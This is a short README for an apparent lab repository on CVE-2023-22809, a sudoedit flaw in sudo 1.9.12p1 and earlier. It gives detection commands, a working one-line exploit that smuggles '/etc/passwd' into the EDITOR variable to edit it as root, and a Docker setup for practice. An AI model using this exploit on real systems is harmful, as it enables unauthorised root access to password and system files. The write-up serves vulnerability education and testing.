# CVE-2023-22809 Sudoedit Bypass
This vulnerability was reported by Synacktiv and a detailed report can be found [here](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)

It affects Sudo<=1.9.12p1 and allows a low privileged user (who has been granted permission to edit a particular file with `sudoedit`) to escalate privileges and access/modify files as root.

## Detection
Check the sudo version is <=1.9.12p1:
```
$ sudo --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
```

Check if you have `sudoedit` privileges on any files with `sudo -l`:
```
$ sudo -l
Matching Defaults entries for user on 3cbc8c6fdc12:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User user may run the following commands on 3cbc8c6fdc12:
    (ALL : ALL) sudoedit /etc/custom/service.conf
```

## Exploitation
Run the allowed `sudoedit` command, preceded by a malicious `EDITOR` variable containing the restricted file you want to edit as root. 

For example, if you're permitted to run `sudoedit /etc/custom/service.conf` and you want to edit the restricted file `/etc/passwd`, run the following:

`EDITOR='vim -- /etc/passwd' sudoedit /etc/custom/service.conf` 

Vim will open `/etc/passwd` with read/write access as root!

## Try it out
Download this repo.

From this folder, run:

`docker build -t ubuntu_sudo .`

Then run the docker:

`docker run -it ubuntu_sudo`

You should be logged in as the user `user`, the password for which is also `user`. 

Try to edit `/etc/passwd` and you do not have write access. Run the detection and exploitation steps above and you should be able to edit it.
